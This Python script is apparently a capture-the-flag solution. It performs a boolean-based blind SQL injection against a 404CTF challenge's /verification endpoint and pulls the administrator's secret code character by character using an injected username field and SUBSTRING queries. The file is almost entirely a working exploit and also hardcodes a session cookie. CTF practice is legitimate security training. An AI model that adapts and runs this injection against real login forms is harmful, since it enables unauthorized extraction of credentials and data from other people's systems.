import requests

cookie_value = ".eJwlzjEOwjAMQNG7ZGZI7Dp2ehnkJLaIhEBKWxbE3Sli_H9673D1adstrPs87BKuo4c1AEhpRI27xpg9O2DK0iJjq2ysDEnVkBfOwL2wI1UtrpljBATU1r0RI9TUpVZHdoFGGaWU3-pLFMcUi2d2S1RNQQjrQl67kIQTcmw2_xo882Vz-Gi6j-cjrK73zT5fudM2qw.ZiaKqw.lbLiSwiq13Tv_D-OV_PpXa-l8YA"

# Création de l'en-tête Cookie
cookies = {'session': cookie_value}


def test_injection(username, condition):
    payload = {
        'username': f"{username}' AND {condition}",
        'code': 'dummy'
    }
    print(condition)
    response = requests.post('https://le-gorfou-42.challenges.404ctf.fr/verification', data=payload, cookies=cookies)
    if 'Code incorrect' in response.text:
        return True
    else:
        return False

def retrieve_code(username):
    code = ''
    i = 1
    while True:
        found_char = False
        for char in range(32, 127):  # ASCII range
            condition = f"SUBSTRING((SELECT Xx_C0D3_xX FROM Xx_US3RS_Xx WHERE Xx_US3RNAM3_xX = '{username}'), {i}, 1) = '{chr(char)}"
            if test_injection(username, condition):
                code += chr(char)
                print(code)
                found_char = True
                break  # Sort de la boucle interne
        if not found_char:
            break  # Sort de la boucle externe si aucun caractère n'est trouvé
        i += 1
    return code

if __name__ == "__main__":
    username = "Xx_ADMINISTRAT0R_xX"
    print("Retrieving code for", username)
    code = retrieve_code(username)
    print("Code:", code)
